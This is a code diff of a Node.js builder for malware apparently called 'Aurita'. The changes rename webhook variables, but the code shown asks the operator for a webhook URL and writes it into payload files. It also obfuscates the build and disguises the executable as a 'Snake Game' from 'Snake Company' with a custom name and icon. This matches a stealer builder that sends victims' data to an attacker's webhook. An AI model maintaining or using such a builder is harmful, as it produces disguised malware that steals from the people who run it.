@@ -1,11 +1,11 @@
 const {
     applyGradient,
     decodeBase64,
-    isWebhook,
+    isWebhookUrl,
     isLinkIcon
 } = require("./utils.js");
 
-const { 
+const {
     build, 
     Platform, 
     Arch 
@@ -116,7 +116,7 @@ const createBuild = async (dest, JSON) => {
 }
 
 const createObf = async (JSON) => {
-    let webhook     = JSON.WEBHOOK,
+    let webhookUrl  = JSON.WEBHOOK,
         exeName     = JSON.EXECUTABLE_NAME ?? "Aurita",
         appCompany  = JSON.APP_COMPANY ?? "Snake Company",
         appFileDesc = JSON.DESC ?? "Snake Game",
@@ -202,7 +202,7 @@ const createObf = async (JSON) => {
     const replaceKeys = (file) => {
         try {
             fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
-                .replace(/%WEBHOOK%/g, webhook)
+                .replace(/%WEBHOOK%/g, webhookUrl)
             );
         } catch (e) {
             console.error(e)
@@ -297,9 +297,9 @@ async function createFucking() {
             console.clear();
             console.log(applyGradient(['#FFFFFF', '#E0BBE4', '#957DAD', '#D291BC', '#F17EF7', '#8A2BE2', '#af45fa'], BANNER_AURITA));
 
-            let webhook = await createAsk("Add your \"WEBHOOK\": ");
-            while (!isWebhook(webhook)) {
-                webhook = await createAsk("Add a \"WEBHOOK\" validity: ");
+            let webhookUrl = await createAsk("Add your \"WEBHOOK\": ");
+            while (!isWebhookUrl(webhookUrl)) {
+                webhookUrl = await createAsk("Add a \"WEBHOOK\" validity: ");
             }
 
             let exIcon = await createAsk("Please specify the \"ICON\" using a url with the extensions (Png, Jpg, WebP): ");
@@ -307,7 +307,7 @@ async function createFucking() {
                 exIcon = await createAsk("Specify a valid link for your \"ICON\" the extensions (Png, Jpg, WebP): ");
             }
 
-            JSON.WEBHOOK         = webhook;
+            JSON.WEBHOOK         = webhookUrl;
             JSON.EXECUTABLE_ICON = exIcon;
             JSON.EXECUTABLE_NAME = await createAsk("Please specify your 'EXE' file \"Name\": ");
             JSON.APP_COMPANY     = await createAsk("Please specify your 'EXE' file \"App Company\": ");
